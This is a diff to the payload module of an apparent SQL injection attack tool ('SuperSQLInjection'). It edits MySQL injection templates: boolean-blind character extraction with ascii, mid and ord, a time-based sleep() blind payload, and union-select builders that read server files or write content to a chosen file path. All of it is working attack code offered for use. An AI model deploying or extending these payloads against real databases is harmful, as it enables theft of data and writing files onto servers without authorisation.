@@ -12,7 +12,7 @@ namespace SuperSQLInjection.payload
         public static List<String> vers = FileTool.readFileToList(path);
 
         public static String char_length = "(select char_length({data}))";
-
+        
         //数据库数量
         public static String dbs_count = "(select count(*) from information_schema.schemata)";
         //表数量
@@ -32,7 +32,7 @@ namespace SuperSQLInjection.payload
 
         public static String bool_length = "char_length({data})";
         public static String bool_value = "ascii(mid({data},{index},1))";
-
+        public static String mid_value = "(mid({data},{index},1))";
 
         //获取数据库数量bool方式
         public static String bool_db_count = " and " + dbs_count + ">{len}";
@@ -45,13 +45,19 @@ namespace SuperSQLInjection.payload
         
 
         //多字符长度判断
-        public static String mu_value = "(hex(convert((mid({data},{index},1)) using UTF8)))";
+        //public static String mu_value = "(hex(convert((mid({data},{index},1)) using UTF8)))";
+        
+        //多字符处理判断
+        public static String ord_value = "(ord(mid({data},{index},1)))";
 
         //bool方式字符长度判断
         public static String ver_length = " and "+ bool_length + ">{len}";
         //bool方式获取值
         public static String ver_value = " and "+ bool_value + ">{len}";
-        
+
+        //bool方式获取值
+        public static String bool_ord_value = " and " + mid_value + ">{len}";
+
         //获取行数据bool
         public static String data_value = "(select {columns} from {dbname}.{table} limit {limit},1)";
 
@@ -70,10 +76,11 @@ namespace SuperSQLInjection.payload
         
         public static String hex = "(select hex({data}))";
         public static String hex_value = "(select hex(convert(({data}) using UTF8)))";
+
         public static String substr_value = "(select substr({data},{start},{len}))";
         public static String getBoolCountBySleep(String data,int maxTime)
         {    
-            return " AND (SELECT * FROM (SELECT(SLEEP("+ maxTime + "-(IF(("+data+ ">{len}), 0, " + maxTime + ")))))"+Tools.RandStr(4)+")";
+            return " and (select * from (select(sleep("+ maxTime + "-(if(("+data+ ">{len}), 0, " + maxTime + ")))))"+Tools.RandStr(4)+")";
         }
 
         /// <summary>
@@ -129,7 +136,7 @@ namespace SuperSQLInjection.payload
             return sb.ToString();
         }
 
-        public static String creatMySQLReadFileByUnion(int columnsLen, int showIndex,String data)
+        public static String creatMySQLReadFileByUnion(int columnsLen, int showIndex,String fill,String data)
         {
             StringBuilder sb = new StringBuilder();
             for (int i = 1; i <= columnsLen; i++)
@@ -142,13 +149,13 @@ namespace SuperSQLInjection.payload
                 else
                 {
 
-                    sb.Append("1,");
+                    sb.Append(fill+",");
                 }
             }
             return sb.Remove(sb.Length - 1, 1).ToString();
         }
 
-        public static String creatMySQLWriteFileByUnion(int columnsLen, int dataIndex, String path,String content)
+        public static String creatMySQLWriteFileByUnion(int columnsLen, int dataIndex,String fill, String path,String content)
         {
             StringBuilder sb = new StringBuilder(" union select ");
             for (int i = 1; i <= columnsLen; i++)
@@ -161,7 +168,7 @@ namespace SuperSQLInjection.payload
                 else
                 {
 
-                    sb.Append("1,");
+                    sb.Append(fill+",");
                 }
             }
             sb.Remove(sb.Length - 1, 1);
